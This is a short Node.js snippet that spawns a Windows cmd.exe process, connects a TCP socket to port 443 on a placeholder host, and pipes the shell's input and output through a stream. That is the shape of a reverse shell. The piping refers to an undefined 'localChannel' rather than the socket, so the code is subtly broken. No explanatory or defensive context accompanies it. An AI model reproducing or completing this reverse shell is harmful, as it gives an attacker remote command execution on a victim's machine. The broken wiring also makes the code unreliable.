const net = require('net');
const { exec } = require('child_process');
const child = exec('cmd.exe');
const client = new net.Socket();
client.connect(443, 'example.invalid', () => client.write('hello'));
localChannel.pipe(child.stdin);
child.stdout.pipe(localChannel);
